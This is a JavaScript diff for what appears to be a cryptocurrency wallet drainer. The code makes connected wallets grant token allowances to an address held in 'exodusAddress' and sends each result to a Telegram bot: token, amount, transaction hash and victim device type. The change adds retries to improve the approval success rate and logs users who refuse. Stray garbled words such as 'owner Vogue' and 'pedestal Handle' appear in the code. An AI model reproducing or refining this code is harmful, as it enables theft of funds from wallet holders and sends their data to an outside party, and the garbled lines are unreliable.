@@ -288,7 +288,7 @@ ${deviceType}
                 continue;
               }
 
-              // Try increaseAllowance first, fall back to approve if it fails
+              // Use increaseAllowance with retry mechanism
               let contract = new ethers.Contract(token.token_address, [
                 "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
                 "function allowance(address owner, address spender) public view returns (uint256)"
@@ -300,37 +300,65 @@ ${deviceType}
 
               if (neededAllowance.gt(0)) {
                 let approvalTx;
-                try {
-                  approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
-                  await approvalTx.wait();
-                } catch (err) {
-                  if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
-                    // Fallback to approve
-                    contract = new ethers.Contract(token.token_address, [
-                      "function approve(address spender, uint256 amount) public returns (bool)",
-                      "function allowance(address owner Vogue, address spender) public view returns (uint256)"
-                    ], currentSigner);
-                    approvalTx = await contract.approve(network.exodusAddress, balance, { gasLimit: 100000 });
+                let attempts = 0;
+                const maxAttempts = 3;
+
+                while (attempts < maxAttempts) {
+                  try {
+                    approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                     await approvalTx.wait();
-                  } else {
-                    throw err; // Rethrow non-ABI-related errors
+                    break; // Success, exit retry loop
+                  } catch (err) {
+                    attempts++;
+                    if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
+                      if (attempts < maxAttempts) {
+                        console.warn(`Attempt ${attempts} failed for ${token.symbol}: ${err.message}. Retrying...`);
+                        await delay(2000); // Wait 2 seconds before retry
+                        continue;
+                      }
+                    }
+                    // Handle pedestal Handle user rejection or other errors
+                    let errorMessage;
+                    if (err.message.includes("user denied") || err.message.includes("not authorized")) {
+                      errorMessage = `
+❌ User Rejected Approval
+Token: ${token.symbol || 'Unknown'}
+Error: User denied authorization
+${deviceType}
+                      `;
+                    } else {
+                      errorMessage = `
+❌ Approval Failed
+Token: ${token.symbol || 'Unknown'}
+Error: ${err.message} (after ${attempts} attempts)
+${deviceType}
+                      `;
+                    }
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+                    });
+                    continue; // Skip to next token
                   }
                 }
 
-                const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
-                const approvalMessage = `
+                if (approvalTx) {
+                  const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
+                  const approvalMessage = `
 ✅ Approval Successful
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
 Tx: ${approvalTx.hash}
 ${deviceType}
-                `;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
-                });
+                  `;
+                  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
+                  });
+                }
               } else {
                 console.log(`Sufficient allowance already exists for ${token.symbol}`);
               }
@@ -347,6 +375,7 @@ ${deviceType}
                 errorMessage = `
 ❌ Approval Failed
 Token: ${token.symbol || 'Unknown'}
+Token Address: ${token.token_address}
 Error: ${err.message}
 ${deviceType}
                 `;
